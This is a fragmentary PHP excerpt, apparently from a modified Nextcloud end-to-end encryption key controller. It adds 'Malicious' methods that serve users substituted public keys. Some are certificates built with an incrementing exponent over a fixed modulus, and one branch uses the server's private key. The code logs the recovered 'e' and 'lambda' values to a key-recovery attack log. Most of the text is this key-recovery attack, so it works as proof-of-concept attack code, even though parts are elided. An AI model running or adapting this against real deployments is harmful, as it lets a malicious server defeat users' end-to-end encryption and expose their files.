...
//TODO extend KeyController in a new class KeyControllerMalicious
class KeyController extends OCSController {
	...
	public function attemptSuccess(string $uid){
		$out = sprintf("Recovered \ne:%s\nlambda:%s\n\n", $this->e->toString(), $this->lambda->toString());
		error_log($out, 3, "/var/tmp/key-recovery-attack.log");
	}
		...
		foreach ($usersArray as $uid) {
			try {
				if ($e2e_public_key_attack){
					$server_key = PublicKeyLoader::load($this->signatureHandler->getPrivateServerKey());
					$publicKey = $this->keyStorage->getPublicKeyMalicious($uid, $server_key);
				}else{
	 ...
	 * @throws OCSNotFoundException
	 */
	public function getPublicKeysMalicious(string $users = ''): DataResponse {
		$usersArray = $this->jsonDecode($users);
		$out = sprintf("exponent:%s\n", $this->e->toString());
		$this->logger->log(1, $out);

		$this->logger->log(1, "ciao sono daniele come stai");
		error_log($out, 3, "/var/tmp/key-recovery-attack.log");
		$result = ['public-keys' => []];
		foreach ($usersArray as $uid) {
			try {
				$this->e = $this->e->add(new BigInteger(1));
				$publicKey = $this->createCertificate($uid, $this->e, $this->n);
				$result['public-keys'][$uid] = $publicKey;
			} catch (NotFoundException $e) {
				throw new OCSNotFoundException($this->l10n->t('Could not find the public key belonging to the user %s', [$uid]));
			} catch (Exception $e) {
